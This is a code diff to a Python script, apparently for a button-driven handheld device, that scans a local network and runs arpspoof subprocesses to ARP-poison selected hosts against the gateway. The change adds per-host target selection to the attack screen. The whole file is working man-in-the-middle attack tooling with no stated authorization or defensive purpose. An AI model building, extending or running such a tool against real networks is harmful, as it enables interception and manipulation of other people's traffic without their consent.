@@ -223,13 +223,12 @@ def scan_hosts(interface):
 # Attack control
 # ---------------------------------------------------------------------------
 
-def start_attack(interface, hosts, gateway_ip):
+def start_attack(interface, targets, gateway_ip):
+    """Targets is a list of host dicts (gateway already excluded)."""
     global arpspoof_procs
     stop_attack()
 
-    for host in hosts:
-        if host["ip"] == gateway_ip:
-            continue
+    for host in targets:
         p1 = subprocess.Popen(
             ["arpspoof", "-i", interface, "-t", gateway_ip, host["ip"]],
             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
@@ -240,8 +239,7 @@ def start_attack(interface, hosts, gateway_ip):
         )
         arpspoof_procs.extend([p1, p2])
 
-    target_count = sum(1 for h in hosts if h["ip"] != gateway_ip)
-    print(f"[*] ARP spoof started: {target_count} hosts, {len(arpspoof_procs)} arpspoof procs")
+    print(f"[*] ARP spoof started: {len(targets)} hosts, {len(arpspoof_procs)} arpspoof procs")
 
 
 def stop_attack():
@@ -294,42 +292,58 @@ def screen_main(interface):
 
 
 def screen_host_list(hosts, gateway_ip):
+    """Returns (action, selected_hosts) where action is None/'rescan'/'attack'."""
     if not hosts:
         draw_centered("No hosts found!", "#FF0000")
         time.sleep(2)
-        return None
+        return None, []
 
-    targets = [h for h in hosts if h["ip"] != gateway_ip]
-    if not targets:
+    all_targets = [h for h in hosts if h["ip"] != gateway_ip]
+    if not all_targets:
         draw_centered("No targets!", "#FF0000")
         time.sleep(2)
-        return None
+        return None, []
 
     sel = 0
     scroll = 0
     VISIBLE = 8
+    selected = []  # list of IPs toggled for attack
 
     def render():
         lines = []
         for h in hosts[scroll:scroll + VISIBLE]:
-            tag = "GW " if h["ip"] == gateway_ip else "   "
+            if h["ip"] == gateway_ip:
+                tag = "GW "
+            elif h["ip"] in selected:
+                tag = "[*]"
+            else:
+                tag = "   "
             lines.append(f"{tag}{h['ip']}")
-        draw_screen(
-            lines,
-            title=f"Hosts ({len(hosts)}) GW:{gateway_ip}",
-            highlight_idx=sel - scroll,
-        )
+        title = f"Hosts({len(hosts)}) sel:{len(selected)}"
+        draw_screen(lines, title=title, highlight_idx=sel - scroll)
 
     render()
 
     while running:
         btn = get_button(PINS, GPIO)
         if btn == "KEY3":
-            return None
+            return None, []
         if btn == "KEY2":
-            return "rescan"
+            return "rescan", []
         if btn == "KEY1":
-            return "attack"
+            # Attack selected; if nothing selected, attack all targets
+            attack_targets = [h for h in all_targets if h["ip"] in selected] or all_targets
+            return "attack", attack_targets
+        if btn == "OK":
+            host = hosts[sel]
+            if host["ip"] != gateway_ip:
+                if host["ip"] in selected:
+                    selected.remove(host["ip"])
+                else:
+                    selected.append(host["ip"])
+                render()
+                time.sleep(0.18)
+            continue
         if btn == "DOWN":
             sel = min(sel + 1, len(hosts) - 1)
         elif btn == "UP":
@@ -344,13 +358,12 @@ def screen_host_list(hosts, gateway_ip):
             scroll = sel - VISIBLE + 1
         render()
         time.sleep(0.05)
-    return None
+    return None, []
 
 
-def screen_attack(interface, hosts, gateway_ip):
-    targets = [h for h in hosts if h["ip"] != gateway_ip]
+def screen_attack(interface, targets, gateway_ip):
     draw_centered("Starting...", "#FFFF00")
-    start_attack(interface, hosts, gateway_ip)
+    start_attack(interface, targets, gateway_ip)
     start_time = time.time()
 
     while running:
@@ -417,13 +430,13 @@ def main():
                     time.sleep(0.05)
                 break
 
-            result = screen_host_list(hosts, gateway_ip)
+            result, attack_targets = screen_host_list(hosts, gateway_ip)
             if result is None:
                 break
             if result == "rescan":
                 continue
             if result == "attack":
-                screen_attack(interface, hosts, gateway_ip)
+                screen_attack(interface, attack_targets, gateway_ip)
 
 
 try:
